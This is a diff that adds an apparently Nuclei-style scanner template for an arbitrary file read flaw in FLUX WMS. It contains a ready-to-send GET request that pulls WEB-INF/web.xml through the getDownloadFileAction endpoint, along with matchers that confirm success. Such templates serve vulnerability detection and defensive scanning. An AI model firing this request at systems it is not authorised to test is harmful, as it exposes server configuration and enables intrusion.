@@ -1,0 +1,31 @@
+id: flux-wms-getdownloadfileaction-anyfile-read
+info:
+  name: FLUX WMS Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/a00webres/getDownloadFileAction?dowmLoadUrl=WEB-INF/web.xml&fileName=web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "web-app"
+      - type: word
+        part: body
+        words:
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "filename=\"web.xml\""
+      - type: word
+        part: header
+        words:
+          - "application/force-download"
